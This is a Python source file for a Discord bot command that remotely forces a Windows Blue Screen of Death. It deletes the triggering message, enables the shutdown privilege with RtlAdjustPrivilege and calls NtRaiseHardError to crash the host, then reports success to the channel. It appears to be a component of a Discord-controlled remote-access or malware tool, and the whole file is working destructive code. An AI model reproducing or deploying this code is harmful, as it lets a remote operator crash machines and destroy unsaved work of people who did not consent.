import ctypes
import platform
import logging
import discord

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

async def trigger_bsod(message):
    """
    Attempts to trigger a Blue Screen of Death (BSoD) on a Windows system.
    
    Parameters:
        message: The message object from Discord containing the command.
    """
    if platform.system() != "Windows":
        embed = discord.Embed(
            title="BSoD Attempt Failed",
            description="This command only works on Windows systems.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        logging.warning("Attempt to trigger BSoD on a non-Windows system.")
        return

    logging.info("Received .bsod command.")
    await message.delete()
    logging.info("Deleted the command message.")

    embed = discord.Embed(
        title="Attempting to Trigger a BSoD",
        description="The bot is trying to trigger a Blue Screen of Death. Stand by...",
        color=discord.Color.orange()
    )
    await message.channel.send(embed=embed)
    logging.info("Sent notification about BSoD attempt.")

    try:
        logging.info("Adjusting privileges for BSoD...")
        privilege_id = 19
        enable_privilege = 1
        current_thread = 0
        ctypes.windll.ntdll.RtlAdjustPrivilege(
            ctypes.c_uint(privilege_id),
            ctypes.c_uint(enable_privilege),
            ctypes.c_uint(current_thread),
            ctypes.byref(ctypes.c_int())
        )

        logging.info("Triggering BSoD...")
        error_status = 0xC000007B
        response_option = 6
        ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(error_status),
            ctypes.c_ulong(0),
            ctypes.POINTER(ctypes.c_int)(),
            ctypes.POINTER(ctypes.c_int)(),
            ctypes.c_uint(response_option),
            ctypes.byref(ctypes.c_uint())
        )

        embed = discord.Embed(
            title="BSoD Triggered",
            description="The Blue Screen of Death was triggered successfully.",
            color=discord.Color.green()
        )
        await message.channel.send(embed=embed)
        logging.info("BSoD triggered successfully.")
    except Exception as e:
        embed = discord.Embed(
            title="BSoD Attempt Failed",
            description=f"Failed to trigger a BSoD. Error: {e}",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        logging.error(f"Failed to trigger BSoD: {e}")
